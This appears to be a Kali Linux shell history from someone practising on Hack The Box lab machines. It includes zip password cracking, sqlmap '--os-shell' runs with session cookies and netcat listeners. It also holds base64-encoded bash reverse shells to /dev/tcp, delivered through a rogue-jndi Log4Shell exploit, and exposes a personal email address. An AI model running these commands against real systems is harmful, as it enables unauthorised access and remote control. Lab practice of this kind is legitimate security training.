@@ -1,0 +1,234 @@
+   38  ssh-keygen -t ed25519 -C "kevinmacash@gmail.com"\n
+   39   cd ../../..
+   40  cd kali
+   41  /bin/python /home/kali/Desktop/maquinas/pytho_practice/python1.py
+   42  settarget 10.10.120.46 Osside
+   43  cd maquinas
+   44  mv * ../Maquinas
+   45  ls maquinas
+   46  ls Maquinas
+   47  rm -r maquinas
+   48  mv dancig Dancing
+   50  airmon-ng
+   51  sudo su 
+   52  wifite wlan0
+   54  shutdown -r now
+   55  sudo airmon-ng start wlan0
+   56  sudo airodump-ng wlan0 mon
+   57  sudo airodump-ng wlan0mon
+   58  sudo su
+   61  settarget 10.129.117.23 Vaccine
+   62  cd Responder
+   63  cat commands_Responder.txt
+   64   ..cd
+   65  │ nmap -sV -sC 10.129.219.211 -vvv -oN escaneo
+   66  nmap -sV -sC 10.129.117.23 -vvv -oN escaneo
+   67  ftp 10.129.117.23
+   68  cp backup.zip Desktop/Maquinas/V
+   69  cp backup.zip Desktop/Maquinas/Vaccine
+   70  rm backup.zip
+   71  rm V
+   72  gunzip backup.zip
+   73  zip2john backup.zip > hash.txt
+   74  cat hash.txt
+   75  unzip /usr/share/wordlists/rockyou.txt.gz    
+   76  gunzip /usr/share/wordlists/rockyou.txt.gz\n
+   77  sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n
+   78  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+   79  unzip backup.zip
+   80  ca index.php
+   81  echo PHPSESSID:"6kvdm2h69m5j01qrtcd36mbnqh" >>cookie
+   82  sql  --url="http://10.129.117.23/dashboard.php?search=META" --cookie="PHPSESSID:6kvdm2h69m5j01qrtcd36mbnqh" --os-shell
+   83  cd LS
+   84   nc -lvnp 4444
+   85  sqlmap  --url="http://10.129.117.23/dashboard.php?search=META" --cookie="PHPSESSID:6kvdm2h69m5j01qrtcd36mbnqh" --os-shell
+   86  sudo sqlmap  --url="http://10.129.117.23/dashboard.php?search=META" --cookie="PHPSESSID:6kvdm2h69m5j01qrtcd36mbnqh" --os-shell
+   88  sudo nc -lvnp 1335r
+   89  sudo nc -lvnp 1335
+   90  ping 10.129.117.23
+   91  sudo sqlmap  --url="http://10.129.117.23/dashboard.php?search=META" --cookie=""PHPSESSID=6kvdm2h69m5j01qrtcd36mbnqh --os-shell
+   93  settarget 10.129.32.153 Vaccine
+   94  ping 10.129.32.153
+   95  cd Desktop/Maquinas/vpn
+   96  cat escaneo
+   97  ftp 10.129.32.153
+   98  cat index.php
+   99  sudo sqlmap  --url="http://10.129.117.23/dashboard.php?search=META" --cookie="PHPSESSID=ear6364qkrid43amuk6s5oah77" --os-shell
+  100  sudo sqlmap  --url="http://10.129.32.153/dashboard.php?search=META" --cookie="PHPSESSID=ear6364qkrid43amuk6s5oah77" --os-shell
+  103  cd V
+  104  cd ../Vpn
+  105  ping 10.10.16.2
+  106  ping 10.10.16.1
+  107  settarget 10.129.95.174 Vaccine
+  108   nc -lvnp 4444ls
+  110  cd Desktop/Maquinas/Vaccine
+  112  sqlmap  --url="http://10.129.95.174/dashboard.php?search=META" --cookie="PHPSESSID=ccnfdaqlk9ktqvs4rfn2vf5bve" --os-shell
+  113  ping 10.129.25.174
+  115  ping 10.129.95.174
+  116  settarget 10.129.195.255 Vaccine
+  117  ping qwerty789
+  118  sudo nc -lvnp 1339
+  119  sudo nc -lvnp 1331
+  120  sqlmap  --url="http://10.129.195.255/dashboard.php?search=META" --cookie="PHPSESSID=9q3ib24eei657gb5plcfiifigt" --os-shell
+  121  sudo nc -lvnp 4444
+  122  sudo nc -lvnp 1337
+  123  sudo nc -lvnp 4242
+  124  cd Desktop/Maquinas/Vpn
+  125  cd Desktop/Maquinas/
+  126  cd Vaccine
+  127  settarget 10.129.195.255 Vaccinet
+  128  ping 10.129.195.255
+  131  settarget 10.129.25.132 Vaccine
+  133  cd Do
+  135  nano document.pdf
+  136  sudo apt install evince\n
+  139  evince document.pdf
+  140  ll
+  141  xit
+  142  python3 -c 'import pty;pty.spawn("/bin/bash")' 
+  143  export TERM=xterm                                                          
+  144  cd ..\\nls
+  146  cd Music
+  147  whoami
+  148  lss
+  149  cd /var/lib/postgresql
+  150  cd 17
+  152  fg %1
+  153  %export TERM=xterm
+  154  fg %
+  155  evince ../../../Downloads/document.pdf
+  156  evice
+  157  evince 
+  158  a
+  159  sd
+  160  as
+  161  nc -lvnp 1331
+  162  export TERM=xterm
+  163  fg 
+  164  export TERM=xterm+alt47      
+  165  lls
+  166  stty sane
+  167  stty raw -echo
+  168  fg
+  169  jobs
+  170  nc -lvnp 1335
+  171  nc -lvnp 1338
+  172  ping 10.129.25.132
+  173  script /dev/null -c bash
+  174  stty raw -echo;fg
+  175  exitxit
+  176  nc -lvnp 1337
+  177  sqlmap  --url="http://10.129.25.132/dashboard.php?search=META" --cookie="PHPSESSID=hfdteiilbo9f51lolj17cg4op2" --os-shell
+  178  script /dev/null -c bas
+  180  exit
+  182  shutdown
+  185  sudo systemctl restart networking.service
+  189  ;s
+  192  ping 192.168.10.103
+  196  cat lo.json
+  202  ls -la
+  213  mkdir Unified
+  217  nmap -sV -sC 10.129.117.23 -vvv -oN escaneo_Unified
+  221  nmap -sV -sC 10.129.219.179 -vvv -oN escaneo_Unified
+  227  nmap -sV  10.129.219.179  -oN escaneo_Unified2
+  230  cat escaneo_Unified
+  231  ping 10.129.219.179
+  234  sudo tcpdump -i tun0
+  237  ping 10.129.52.218
+  239  nano escaneo_Unified
+  243  cd Unified
+  246  sudo apt update
+  247  sudo apt upgrade
+  248  sudo apt install opendjk-11-djk -y
+  249  sudo apt install openjdk-11-jdk -y
+  251  sudo apt-get install maven
+  253  java --version
+  255  git clone https://github.com/veracode-research/rogue-jndi
+  259  mvn package
+  262  cd ../..
+  264  cat cmd
+  265  echo "bash -c bash -i >&/dev/tcp/10.10.14.29/9001 0>&1" | base64  
+  267  cd rogue-jndi/target
+  271  java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjkvOTAwMSAwPiYxCg==} | {base64 -d} | {bash, -i}" --hostname "10.10.14.29"
+  272  sudo nc -lvnp 9001
+  278  sudo openvpn starting_point_kevinmacas\(UDP\).ovpn
+  279  ping 10.129.96.149
+  281  cd ../Unified
+  283  cat escaneo_Unified2
+  286  sudo tcpdump -i tun0 port 389
+  287  echo "bash -c bash -i >&/dev/tcp/10.129.96.149/4444 0>&1" | base64  
+  288  echo "bash -c bash -i >&/dev/tcp/10.10.15.1/4444 0>&1" | base64  
+  291  cd rogue-jndi
+  292  cd target
+  294  java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMS80NDQ0IDA+JjEK} | {base64 -d} | {bash, -i}" --hostname "10.10.15.1"
+  295  ipconfig
+  297  ping 8.8.8.8
+  308  sudo openvpn starting_point_kevinmacas.ovpn
+  315  mkdir Seanson7machines
+  317  cd Se
+  325  cd Dancing
+  329  cd ../Downloads
+  331  sudo openvpn competitive_kevinmacas.ovpn
+  332  ping 10.10.11.51
+  334  nmap -sV  10.10.11.51  -oN escaneo_Unified2
+  335  ifconfig
+  336  ping 192.168.10.1
+  337  ping 192.168.100.1
+  339  cd Desktop
+  341  mkdir DockerLabs
+  342  cd DockerLabs
+  344  mv ../../Downloads/injection.zip .
+  346  tar -x injection.zip 
+  350  unzip injection.zip
+  354  cd Maquinas
+  356  mkdir StarPoint
+  358  mv Crocodile StarPoint/.
+  360  mv Responder StarPoint/.
+  362  mv Vaccine StarPoint/.
+  363  mv Dancing StarPoint/.
+  365  mv Redeemer StarPoint/.
+  366  mv Sequel StarPoint/.
+  367  mv Unified StarPoint/.
+  369  mv Three StarPoint/.
+  371  cd vpn
+  375  rm -r vpn
+  377  cd bash_practice
+  381  mkdir Programming
+  382  l
+  384  mv bash_practice Programming/.
+  385  mv pytho_practice Programming/.
+  387  cd Seanson7machines
+  391  mv Seanson7machines StarPoint/.\
+  392  mv Seanson7machines StarPoint/.
+  394  rm packages.microsoft.gpg
+  396  cd Entorno
+  400  rm -r Entorno
+  402  mv StarPoint StartPoint
+  404  cd StartPoint
+  408  mkdir Machines
+  410  cd Machines
+  412  cd Desktop/Maquinas
+  414  cd Vpn
+  419  mkdir Chemistry
+  422  ping ^[[200~10.10.11.38~
+  424  sudo openvpn starting_point_kevinmacas\(TCP\).ovpn
+  432  LS
+  434  cd Downloads
+  436  cat document
+  437  cat document.pdf
+  438  cat bspwmShortcuts.txt
+  440  cd ..
+  442  cd Desktop/Maquinas/Machines
+  444  cd VPN
+  448  cat Downloads/bspwmShortcuts.txt
+  450* sudo openvpn lab_kevinmacas\(TCP\).ovpn
+  453  ping 10.10.11.38
+  455  cd ../Chemistry
+  457  nmap -sV  10.10.11.38  -oN escaneo_Chemistry
+  459  cat escaneo_Chemistry
+  460  man
+  461  history
+  462  history >> texto.txt
+  463  ls
+  464  cat texto.txt
+  465  history 
